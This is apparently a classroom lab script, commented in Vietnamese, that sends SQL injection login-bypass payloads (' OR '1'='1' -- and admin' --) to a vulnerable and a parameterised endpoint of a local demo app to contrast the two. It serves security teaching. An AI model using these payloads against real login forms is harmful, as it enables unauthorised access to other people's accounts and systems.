#!/usr/bin/env python3
"""
Lab 6 - Minh hoạ SQL Injection trên form đăng nhập (CHỈ dùng app demo của chính mình).

CẢNH BÁO: Script chỉ trỏ tới http://localhost:6060 (app demo tự dựng).
Không dùng kỹ thuật này lên hệ thống của người khác -> vi phạm pháp luật.

Chạy:  python sqli_demo.py vulnerable   # endpoint có lỗ hổng -> bypass được
       python sqli_demo.py secure       # endpoint tham số hoá -> bị chặn
"""
import sys
import requests

TARGET = "http://localhost:6060"

# Các payload thử nghiệm: (mô tả, username, password)
PAYLOADS = [
    ("Đăng nhập thường, mật khẩu SAI",      "user1",            "sai_mat_khau"),
    ("SQLI: ' OR '1'='1' --  (bỏ qua mật khẩu)", "' OR '1'='1' --", ""),
    ("SQLI: admin' --  (đăng nhập thẳng vào admin)", "admin' --",   ""),
]


def try_login(endpoint, username, password):
    r = requests.post(f"{TARGET}/api/login-{endpoint}",
                      json={"username": username, "password": password}, timeout=5)
    try:
        return r.status_code, r.json()
    except ValueError:
        return r.status_code, {}


def run(endpoint):
    print(f"[*] Thử SQL Injection -> /api/login-{endpoint}\n")
    for desc, un, pw in PAYLOADS:
        status, data = try_login(endpoint, un, pw)
        print(f"  {desc}")
        print(f"    username = {un!r} | password = {pw!r}")
        if data.get("success"):
            rows = data.get("rows", [])
            print(f"    -> ✔ ĐĂNG NHẬP ĐƯỢC (HTTP {status}) | {len(rows)} dòng khớp | {data.get('message')}")
        else:
            print(f"    -> ✘ bị từ chối (HTTP {status}) | {data.get('message')}")
        print()


if __name__ == "__main__":
    endpoint = sys.argv[1] if len(sys.argv) > 1 else "vulnerable"
    if endpoint not in ("vulnerable", "secure"):
        print("Dùng: python sqli_demo.py [vulnerable|secure]")
        sys.exit(1)
    run(endpoint)
